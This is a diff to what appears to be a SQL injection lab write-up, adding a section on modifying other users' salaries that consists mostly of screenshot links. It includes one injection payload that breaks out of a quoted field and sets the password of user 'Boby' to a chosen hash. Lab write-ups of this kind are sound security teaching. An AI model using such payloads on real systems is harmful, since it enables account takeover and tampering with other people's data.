@@ -94,19 +94,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 ![image](https://github.com/user-attachments/assets/4636f1c2-4c86-45bf-91b1-d3b995e00d42)
 
 
+    
+
+4.4.2. Modify other people’ salary
+
+
+![image](https://github.com/user-attachments/assets/9d3fec17-d006-4ecd-838a-d2559d03c986)
+
+
+![image](https://github.com/user-attachments/assets/b98a910c-8c37-4243-9e16-9cd45f33fcfb)
 
 
 
 
+![image](https://github.com/user-attachments/assets/b6a0c010-b8b5-4e9a-98b2-fc76dae9dc4b)
+
+
+son ' , password = 'c22b5f9178342609428d6f51b2c5af4c0bde6a42' where name='Boby' --  
+
+![image](https://github.com/user-attachments/assets/13d117b7-2d02-4744-b40b-2fdbf48cc81c)
 
 
 
-
-
-
-
-
-
+![image](https://github.com/user-attachments/assets/1ccfbcf9-f3b3-4964-8355-c1fe30ef673b)
 
 
 
